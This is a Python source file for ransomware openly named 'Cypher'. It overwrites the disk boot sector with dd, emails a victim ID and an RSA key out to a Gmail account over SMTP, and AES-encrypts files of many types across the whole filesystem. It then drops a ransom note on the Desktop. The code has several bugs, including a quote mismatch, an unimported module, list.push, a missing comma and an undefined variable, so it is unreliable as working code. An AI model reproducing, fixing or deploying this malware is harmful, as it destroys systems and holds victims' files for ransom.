import os 
import random
import struct
import smtplib
import string
import datetime
import time

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from multiprocessing import Pool

ID = ''
key = RSA.generate(2048)
exKey = RSA.exportKey('PEM')

if sys.platform == 'linux2'':
	try:
		os.system("dd if=boot.bin of=/dev/hda bs=512 count=1")
		os.system("sleep 1 && exit")
	except:
		try:	
			os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1")
			os.system("sleep 1 && exit")
		except:
			pass

def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
	global ID
	ID = ''.join(random.choice(chars) for _ in range(size))


def send_ID_Key():
	ts = datetime.datetime.now()
	SERVER = "smtp.gmail.com" 		
	PORT = 587 						
	USER= "address@gmail.com"		# Specify Username Here 
	PASS= "prettyflypassword"	    # Specify Password Here
	FROM = USER
	TO = ["address@gmail.com"] 		
	SUBJECT = "Ransomware data: "+str(ts)
	MESSAGE = """\Client ID: %s Decryption Key: %s """ % (ID, exKey)
	message = """\ From: %s To: %s Subject: %s %s """ % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
	try:              
		server = smtplib.SMTP()
		server.connect(SERVER, PORT)
		server.starttls()
		server.login(USER, PASS)
		server.sendmail(FROM, TO, message)
		server.quit()
	except Exception as e:
		# print e
		pass
	


def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):

    if not out_filename:
        out_filename = in_filename + '.crypt'

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))
				
				

def single_arg_encrypt_file(in_filename):
    encrypt_file(key, in_filename)

def selectfiles():
    
    ext = [".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv", 
           ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
           ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
           ".jpg",".jpeg",".png", ".tiff", ".zip", ".7z", ".exe", 
           ".tar.gz", "tar", ".mp3", ".sh", ".c", ".h", ".txt"]
           
    files_to_enc = []
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith(tuple(ext)):
                files_to_enc.push(os.path.join(root, file))

    pool = Pool(processes=4)
    pool.map(single_arg_encrypt_file, files_to_enc)
				

def note():
	
	readme = """
	
	.d8888b.                    888                       
	d88P  Y88b                   888                       
	888    888                   888                       
	888        888  888 88888b.  88888b.   .d88b.  888d888 
	888        888  888 888 "88b 888 "88b d8P  Y8b 888P"   
	888    888 888  888 888  888 888  888 88888888 888     
	Y88b  d88P Y88b 888 888 d88P 888  888 Y8b.     888     
	"Y8888P"   "Y88888 88888P"  888  888  "Y8888  888     
        	        888 888                                
        	 Y8b d88P 888                                
        	 "Y88P"  888     
	
	
	
	Hello, unfortunately all your personal files have been encrypted with millitary grade encryption and will be impossible to retrieve
	without aquiring the encryption key and decrypting binary. As of yet these are not available to you since the Cypher ransomware is still under construction. We thank you for your patience.

	Have a nice day,

	The Cypher Project.""" 	
	
	# Windows variant
	# outdir = os.getenv('USERNAME') + "\\Desktop"
	
	outdir = os.getenv('HOME') + "/Desktop/"
	outfile = outdir + "README"
	
	handler = open(outputfile, 'w')
	handler.write(outfile, ID)
	handler.close()
	
if __name__=="__main__":
	gen_client_ID()
	send_ID_Key()
	
	try:
		selectfiles()
		note()
	except Exception as e:
		pass
